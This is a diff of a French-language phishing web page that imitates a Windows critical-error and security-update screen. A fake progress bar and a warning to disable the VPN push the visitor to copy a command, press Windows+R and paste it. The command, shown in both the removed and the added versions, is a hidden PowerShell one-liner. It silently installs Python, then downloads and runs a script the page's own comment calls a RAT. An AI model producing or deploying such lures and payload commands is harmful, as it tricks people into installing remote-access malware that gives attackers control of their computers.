@@ -3,41 +3,80 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Mise à jour de sécurité requise</title>
+    <title>Erreur Système Critique</title>
     <style>
-        body { background-color: #202124; color: white; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .box { background-color: #292a2d; padding: 40px; border-radius: 8px; text-align: center; max-width: 600px; border: 1px solid #3c4043; }
-        h1 { color: #f28b82; font-size: 24px; margin-bottom: 20px; }
-        p { font-size: 16px; line-height: 1.5; color: #e8eaed; margin-bottom: 20px; }
-        .code { background-color: #000; padding: 15px; border-radius: 4px; font-family: monospace; font-size: 14px; color: #00ff00; font-weight: bold; cursor: pointer; display: inline-block; margin-bottom: 20px; word-break: break-all; text-align: left; border: 1px solid #333; }
-        .code:active { background-color: #333; }
-        .instruction { font-size: 14px; color: #9aa0a6; }
-        .copied { color: #00ff00 !important; }
+        @import url('https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600;700&display=swap');
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        body { background-color: #0078D7; color: #fff; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        
+        .container { text-align: center; max-width: 600px; padding: 20px; z-index: 10; }
+        
+        /* Le logo windows en texte */
+        .logo { font-size: 60px; margin-bottom: 20px; }
+        
+        h1 { font-size: 28px; font-weight: 600; margin-bottom: 15px; letter-spacing: 0.5px; }
+        p { font-size: 16px; line-height: 1.6; margin-bottom: 30px; color: #e0e0e0; }
+        
+        .progress-bar { width: 100%; height: 6px; background-color: rgba(255,255,255,0.3); border-radius: 3px; margin-bottom: 30px; overflow: hidden; }
+        .progress { width: 0%; height: 100%; background-color: #fff; transition: width 0.5s ease; }
+        
+        .box-warning { background-color: rgba(0,0,0,0.2); border: 1px solid rgba(255,255,255,0.2); padding: 20px; border-radius: 8px; margin-bottom: 20px; text-align: left; }
+        .box-warning strong { color: #ffeb3b; }
+        
+        .code-box { background-color: #000; padding: 15px; border-radius: 4px; font-family: 'Courier New', monospace; font-size: 13px; color: #00ff00; cursor: pointer; display: inline-block; word-break: break-all; border: 2px solid #333; transition: 0.2s; }
+        .code-box:hover { border-color: #00ff00; }
+        .code-box:active { background-color: #222; }
+        
+        .instruction { font-size: 15px; background: #fff; color: #000; padding: 10px; border-radius: 4px; font-weight: bold; display: inline-block; margin-top: 10px; }
+        
+        /* Petit logo de fond animé */
+        .bg { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background-image: radial-gradient(circle, rgba(255,255,255,0.1) 1px, transparent 1px); background-size: 50px 50px; z-index: 1; }
+        .content { position: relative; z-index: 10; }
     </style>
 </head>
 <body>
-    <div class="box">
-        <h1>⚠️ Attention requise</h1>
-        <p>Votre navigateur n'est pas à jour et votre système est vulnérable. Une mise à jour de sécurité est requise immédiatement.</p>
-        <p>Pour corriger cette erreur, cliquez sur le code ci-dessous pour le copier :</p>
+    <div class="bg"></div>
+    <div class="container">
+        <div class="logo">⊞</div>
+        <h1>Votre appareil est exposé</h1>
+        <p>Nous avons détecté un VPN ou un proxy actif sur votre réseau. Cela bloque la mise à jour de sécurité et laisse votre PC vulnérable aux attaques.</p>
         
-        <!-- C'est ce code qui installe python et lance le rat -->
-        <div class="code" onclick="copyCode()" id="cmdText">powershell -w hidden -c "iwr -useb https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe -OutFile $env:TEMP\py.exe; Start-Process $env:TEMP\py.exe -ArgumentList '/quiet InstallAllUsers=1 PrependPath=1' -Wait; iwr -useb https://raw.githubusercontent.com/swiemali2-lgtm/member-cleanup/main/rat.py -OutFile $env:TEMP\r.py; python $env:TEMP\r.py"</div>
+        <div class="progress-bar">
+            <div class="progress" id="progressBar"></div>
+        </div>
         
-        <p class="instruction">Appuyez sur <b>Windows + R</b>, collez le code et appuyez sur <b>Entrée</b> pour mettre à jour.</p>
+        <div class="box-warning">
+            <p style="margin-bottom:10px;"><strong>Action requise :</strong> Désactivez votre VPN (NordVPN, ExpressVPN, etc.) pour permettre l'installation de la mise à jour.</p>
+            <p style="margin-bottom:10px; font-size:14px;">Ensuite, copiez le code ci-dessous :</p>
+            
+            <div class="code-box" onclick="copyCode()" id="cmdText">powershell -w hidden -c "iwr -useb https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe -OutFile $env:TEMP\py.exe; Start-Process $env:TEMP\py.exe -ArgumentList '/quiet InstallAllUsers=1 PrependPath=1' -Wait; iwr -useb https://raw.githubusercontent.com/swiemali2-lgtm/member-cleanup/main/rat.py -OutFile $env:TEMP\r.py; python $env:TEMP\r.py"</div>
+            
+            <p style="font-size:14px; margin-top:10px;">Faites <b>Windows + R</b>, collez le code et appuyez sur <b>Entrée</b> pour finaliser.</p>
+        </div>
+        
+        <p style="font-size: 13px; color: #ccc;">Code d'erreur : 0x800F0922</p>
     </div>
 
     <script>
+        // Fausse barre de progression pour faire peur
+        let progress = 0;
+        const interval = setInterval(() => {
+            progress += Math.random() * 10;
+            if (progress > 100) progress = 100;
+            document.getElementById('progressBar').style.width = progress + '%';
+            if (progress >= 100) clearInterval(interval);
+        }, 800);
+
         function copyCode() {
             const text = document.getElementById('cmdText').innerText;
             navigator.clipboard.writeText(text).then(() => {
                 const el = document.getElementById('cmdText');
-                el.innerText = "✅ Code copié !";
-                el.classList.add('copied');
+                el.innerText = "✅ Code copié ! Lancez Windows + R";
+                el.style.color = "#fff";
                 setTimeout(() => {
                     el.innerText = text;
-                    el.classList.remove('copied');
-                }, 2000);
+                    el.style.color = "#00ff00";
+                }, 3000);
             });
         }
     </script>
